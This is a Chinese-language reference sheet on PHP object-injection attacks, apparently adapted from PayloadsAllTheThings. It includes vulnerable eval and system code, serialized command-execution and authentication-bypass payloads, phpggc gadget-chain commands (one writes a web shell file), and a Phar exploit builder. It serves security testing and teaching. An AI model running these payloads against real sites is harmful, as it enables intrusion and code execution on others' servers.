# PHP Deserialization - PHP反序列化

[SEARCH_KEYWORDS]
漏洞类型: PHP Deserialization PHP反序列化 Object Injection
攻击类型: RCE Remote Code Execution Authentication Bypass
关键词: unserialize serialize __wakeup __destruct __toString O: Tz:
魔术方法: __construct __destruct __wakeup __toString __call __get __set
工具: phpggc phar
技术: POP Chain Gadget Chain Type Juggling Phar Deserialization

[CONTENT]

## PHP反序列化概述

PHP对象注入是一种应用级漏洞，允许攻击者执行代码注入、SQL注入、路径遍历等攻击。当用户输入未经适当清理传递给`unserialize()`函数时发生。

## 魔术方法

| 方法 | 触发时机 |
|------|----------|
| `__wakeup()` | 对象反序列化时 |
| `__destruct()` | 对象销毁时 |
| `__toString()` | 对象转字符串时 |
| `__construct()` | 对象创建时 |
| `__call()` | 调用不存在方法时 |
| `__get()` | 访问不存在属性时 |

## 基础利用

### 漏洞代码示例

```php
<?php
class PHPObjectInjection {
    public $inject;
    function __wakeup() {
        if(isset($this->inject)){
            eval($this->inject);
        }
    }
}
$var1 = unserialize($_REQUEST['r']);
?>
```

### Payload构造

```php
// 基础序列化数据
a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}

// 命令执行
O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('whoami');";}
```

## 认证绕过

### 类型混淆

```php
// 漏洞代码
if ($data['username'] == $adminName && $data['password'] == $adminPassword)

// Payload: true == "str" 为真
a:2:{s:8:"username";b:1;s:8:"password";b:1;}
```

## 引用绕过

```php
// 使两个属性指向同一值
O:13:"ObjectExample":2:{s:10:"secretCode";N;s:5:"guess";R:2;}
```

## POP Chain (Gadget Chain)

使用phpggc生成payload:

```powershell
phpggc monolog/rce1 'phpinfo();' -s
phpggc monolog/rce1 assert 'phpinfo()'
phpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data
phpggc Monolog/RCE2 system 'id' -p phar
```

支持的框架：Laravel, Symfony, SwiftMailer, Monolog, SlimPHP, Doctrine, Guzzle

## Phar反序列化

使用`phar://`包装器触发反序列化：

```php
<?php
class AnyClass {
    public $data = null;
    function __destruct() {
        system($this->data);
    }
}

$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");

$object = new AnyClass('whoami');
$phar->setMetadata($object);
$phar->stopBuffering();
?>
```

### 触发方式

```php
file_get_contents("phar://./archives/app.phar");
```

## 序列化格式

| 类型 | 格式 |
|------|------|
| String | s:length:"value" |
| Integer | i:value |
| Boolean | b:1 或 b:0 |
| Array | a:length:{...} |
| Object | O:classname_length:"classname":property_count:{...} |
| NULL | N |

## 工具

- phpggc - PHP反序列化Gadget Chain生成器
- PHPGGC在线生成

## 参考文档

原始来源: PayloadsAllTheThings/Insecure Deserialization/PHP.md